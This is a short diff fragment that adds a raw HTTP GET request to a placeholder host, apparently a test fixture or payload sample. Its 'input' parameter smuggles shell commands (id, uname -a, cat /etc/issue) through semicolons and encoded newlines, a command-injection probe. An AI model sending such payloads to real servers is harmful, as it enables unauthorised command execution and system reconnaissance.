@@ -1,0 +1,4 @@
+GET /a?input=;%0aid;%0auname%0a-a;%0acat%0a/etc/issue HTTP/1.1
+Host: demo.example.com
+Connection: close
+
